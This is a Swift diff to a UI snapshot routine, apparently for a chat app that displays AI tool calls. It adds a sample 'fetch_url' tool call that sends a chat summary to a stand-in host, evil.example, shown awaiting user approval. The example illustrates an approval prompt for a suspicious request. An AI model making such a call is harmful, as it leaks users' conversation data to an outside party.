@@ -73,6 +73,10 @@ public enum UISnapshot {
 
         let fetching = try DevToolsSnapshot.makeFetchStore(defaults: defaults, directory: scratch)
         try write(RootView(store: fetching), size: chatSize, appearance: appearance, to: file("fetch"))
+        let asked = ToolCall(id: "call_1", name: "fetch_url", arguments: #"{"url":"https://evil.example/collect?q=chat summary"}"#,
+                             server: "https://evil.example/collect?q=chat summary")
+        try write(ToolCallRow(call: asked, running: true, awaiting: true, resolve: { _ in }).padding().frame(width: 390).theme(theme),
+                  size: CGSize(width: 390, height: 190), appearance: appearance, to: file("fetch-ask"))
 
         // A reply that can't reach its server leaves a request with no response, and Inspect on the banner.
         let failing = try await DevToolsSnapshot.makeFailingStore(defaults: defaults, directory: scratch)
